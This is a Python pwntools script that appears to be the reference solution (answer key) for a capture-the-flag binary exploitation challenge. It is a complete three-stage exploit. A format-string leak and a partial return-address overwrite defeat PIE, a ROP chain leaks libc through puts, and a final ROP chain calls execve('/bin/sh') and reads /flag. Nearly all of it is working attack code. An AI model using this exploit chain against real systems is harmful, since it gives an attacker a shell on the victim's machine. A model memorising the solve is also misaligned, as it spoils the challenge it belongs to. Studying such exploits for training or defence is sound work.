#!/usr/bin/env python3
"""Reference solve for pwn_ret2libc (PIE hardened).

Three-stage single-connection exploit:
  1. Format-string leak of PIE base + partial overwrite to loop back to vuln()
  2. ROP leak of libc puts via puts@plt(puts@got), return to main
  3. execve("/bin/sh", NULL, NULL) ROP chain
"""
import re
import time
import os

from pwn import context, ELF, ROP, p64, remote, u64

context.binary = e = ELF("/app/challenge/vuln")
libc_path = os.path.join(os.path.dirname(__file__), "assets", "libc.so.6")
libc = ELF(libc_path)

OFFSET = 72            # 64 (buf) + 8 (saved rbp)
FMT_POS = 15           # %15$p leaks the return address from vuln -> main
RET_ADDR_OFF = 0x120b  # original return address offset (after call vuln in main)
# After partial overwrite (LSB 0x0b -> 0x01), printf leaks PIE_base+0x1201:
LEAK_OFF = 0x1201
LOOP_LSB = 0x01        # LSB to overwrite return addr -> jumps to `call vuln` again

# Gadget offsets (from disassembly, compiled with -fcf-protection=none)
POP_RDI_OFF  = 0x1283  # pop rdi; ret (unaligned in __libc_csu_init)
RET_OFF      = 0x1284  # ret
PUTS_PLT_OFF = 0x1040  # puts@plt
PUTS_GOT_OFF = 0x3fb8  # puts@got
MAIN_OFF     = 0x11c1  # main

r = remote("target", 8303)

# ==== Stage 1: leak PIE base + partial overwrite to loop back ====
r.recvline()  # "Enter your name: \n"

# Payload: format string (null-terminated) + padding + 1-byte overwrite.
# The return address at buf[72] is PIE_base+0x120b.  Its LSB is always 0x0b
# (lower 12 bits of the address are fixed by the page-aligned base + offset).
# Overwriting the LSB to 0x01 redirects to PIE_base+0x1201 which is
# `mov eax,0; call vuln` — giving us a second vuln() call in the same proc.
stage1 = f"%{FMT_POS}$p\x00".encode()       # 6 bytes, null-terminated
stage1 += b"B" * (OFFSET - len(stage1))     # pad to 72 bytes
stage1 += bytes([LOOP_LSB])                  # overwrite LSB of return address
r.send(stage1)

leak_line = r.recvline().strip()
pie_leak = int(leak_line, 16)
pie_base = pie_leak - LEAK_OFF
e.address = pie_base
print("leaked pie base:", hex(pie_base), flush=True)

# Program looped back to vuln() — receive the next prompt
r.recvline()  # "Enter your name: \n"

# ==== Stage 2: leak libc puts via ROP, return to main ====
pop_rdi   = pie_base + POP_RDI_OFF
ret       = pie_base + RET_OFF
puts_plt  = pie_base + PUTS_PLT_OFF
puts_got  = pie_base + PUTS_GOT_OFF
main_addr = pie_base + MAIN_OFF

# Start with null byte so printf outputs nothing (avoids interpreting
# ROP chain bytes as format specifiers).
payload1 = b"\x00" + b"B" * (OFFSET - 1)
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(ret)          # stack alignment for puts (movaps)
payload1 += p64(puts_plt)
payload1 += p64(ret)          # stack alignment for main
payload1 += p64(main_addr)
r.send(payload1)

# Output: \n (putchar) then <leaked_address>\n (puts) then "Enter your name: \n"
r.recvuntil(b"\n")            # skip putchar newline
leak_line = r.recvline()      # puts leak (raw bytes + \n)
libc_puts = u64(leak_line[:-1].ljust(8, b"\0"))
libc.address = libc_puts - libc.symbols["puts"]
print("leaked libc base:", hex(libc.address), flush=True)

r.recvline()  # "Enter your name: \n"

# ==== Stage 3: execve("/bin/sh", NULL, NULL) ====
lrop = ROP(libc)
binsh = next(libc.search(b"/bin/sh"))
pop_rsi = lrop.find_gadget(["pop rsi", "ret"]).address
pop_rdx_rb = lrop.find_gadget(["pop rdx", "pop rbx", "ret"])
pop_rdx_solo = lrop.find_gadget(["pop rdx", "ret"])

chain = p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0)
if pop_rdx_rb is not None:
    chain += p64(pop_rdx_rb.address) + p64(0) + p64(0)
elif pop_rdx_solo is not None:
    chain += p64(pop_rdx_solo.address) + p64(0)
else:
    raise SystemExit("no pop rdx gadget in libc")
chain += p64(libc.symbols["execve"])

payload2 = b"\x00" + b"B" * (OFFSET - 1) + chain
r.send(payload2)
time.sleep(0.4)
r.sendline(b"cat /flag")
time.sleep(0.8)
data = r.recv(timeout=2)
print(data.decode("latin1", "replace"), flush=True)
m = re.search(rb"[A-Za-z0-9_]+\{[^}]+\}", data)
if m:
    print(m.group(0).decode(), flush=True)
r.close()
